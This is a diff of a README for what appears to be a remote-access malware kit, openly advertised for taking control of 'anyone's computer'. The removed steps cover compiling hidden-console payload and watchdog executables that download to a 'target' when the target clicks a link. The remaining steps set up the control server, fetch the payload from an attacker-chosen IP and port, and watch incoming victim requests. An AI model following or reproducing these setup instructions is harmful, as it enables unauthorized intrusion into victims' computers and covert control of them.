@@ -4,21 +4,13 @@ Take control of anyone's computer like it's non of your buisness, because it is 
 
 # Instructions:
 
-1) Make sure all files are in the same folder.
+1) open server.cfg and change the server and port to what you want the server to run on.
 
-2) create a folder called static, and in that folder create a folder called windows.
+2) run server.py using " python server.py " or " python3 server.py " from the commandline.
 
-3) compile payload.py, and watchdog.py with "Nuitka" using the command " python -m nuitka --onefile --disable-console script.py"
+3) test by downloading the Watchdog file from the link "http://<yourip>:<port>/downloads/windows/watchdog"
 
-4) place both compiled files in the Windows folder you created ealiar, these files will be automatically downloaded to your target when they click the link.
-
-5) open server.cfg and change the server and port to what you want the server to run on.
-
-6) run server.py using " python server.py " or " python3 server.py " from the commandline.
-
-7) test by downloading the Watchdog file from the link "http://<yourip>:<port>/downloads/windows/watchdog"
-
-8) you should see requests comming in to your server...enjoy
+4) you should see requests comming in to your server...enjoy
 
 
 
